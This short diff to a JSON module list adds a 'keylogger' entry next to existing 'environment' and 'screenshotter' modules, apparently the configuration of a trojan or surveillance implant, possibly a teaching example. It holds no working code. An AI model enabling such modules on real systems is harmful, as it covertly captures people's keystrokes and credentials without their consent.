@@ -6,6 +6,9 @@
     "module" : "environment"
   },
   {
+    "module" : "keylogger"
+  },
+  {
     "module" : "screenshotter"
   }
 ]
